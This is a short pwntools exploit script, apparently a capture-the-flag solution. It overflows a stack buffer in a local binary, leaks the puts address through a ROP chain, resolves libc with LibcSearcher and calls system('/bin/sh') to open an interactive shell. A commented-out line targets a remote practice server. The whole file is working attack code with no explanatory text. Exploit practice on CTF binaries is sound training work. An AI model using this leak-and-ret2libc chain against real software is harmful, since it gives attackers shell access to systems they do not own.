from pwn import *
from LibcSearcher import *
#p=remote('node3.buuoj.cn',29946)
context.terminal = ['tmux','splitw','-h']
def debug():
    gdb.attach(p)
    pause()
p=process('./1')
elf = ELF('./1')
puts_plt = elf.symbols['puts']
puts_got=elf.got['puts']
main=elf.symbols['main']
call_puts = 0x4007BF
pop_rdi = 0x0000000000400843
payload=(0x10c)*'a'+'\x18'+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
payload+=p64(main)
p.sendline(payload)
print p.recvline()
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
print hex(puts_addr)
libc=LibcSearcher('puts',puts_addr)
libc_base=puts_addr-libc.dump('puts')
system=libc_base+libc.dump('system')
binsh=libc_base+libc.dump('str_bin_sh')
payload=(0x110)*'a'+'\x18'+p64(pop_rdi)+p64(binsh)+p64(system)
payload+=p64(main)
p.sendline(payload)
p.interactive()
